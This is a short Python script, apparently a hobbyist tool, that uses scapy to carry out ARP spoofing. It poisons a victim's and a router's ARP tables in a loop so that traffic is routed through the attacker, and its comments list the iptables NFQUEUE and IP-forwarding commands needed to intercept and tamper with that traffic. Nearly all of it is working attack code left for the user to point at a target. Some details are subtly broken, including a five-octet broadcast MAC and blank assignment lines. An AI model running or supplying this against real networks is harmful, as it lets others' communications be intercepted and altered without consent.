#!/usr/bin/env python

#>> must run iptables -I INPUT -j NFQUEUE --queue-num 0 (use for packets whose destination is your computer)
#>> must run iptables -I OUTPUT -j NFQUEUE --queue-num 0 (use for packets whose source is your computer)
#must run iptables -I FORWARD -j NFQUEUE --queue-num 0 (use for packets being routed through your computer)
#in terminal: echo 1 > /proc/sys/net/ipv4/ip_forward
#can clear with iptables --flush

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered = scapy.srp(arp_req_broadcast, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    
def restore(client_ip, router_ip):
    client_mac = get_mac(client_ip)
    router_mac = get_mac(router_ip)
    packet = scapy.ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(packet, count=4, verbose=False)
    
target_ip = #enter as string
router_ip = #enter as string    
    
try:
    packets_sent = 0
    while True:
        spoof(target_ip, router_ip) #to victim
        spoof(router_ip, target_ip) #to router
        packets_sent += 2
        print("\rPackets Sent: " + str(packets_sent))
        sys.stdout.flush()
        time.sleep(3)
except KeyboardInterrupt:
    print("\nDetected user input to quit... restoring ARP Table")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)